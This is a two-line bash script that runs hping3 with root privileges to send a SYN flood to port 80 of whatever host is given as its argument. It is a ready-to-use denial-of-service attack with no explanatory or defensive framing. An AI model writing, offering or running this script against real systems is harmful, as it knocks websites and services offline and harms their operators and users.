#!/bin/bash
sudo hping3 -S --flood -p 80 "$1"
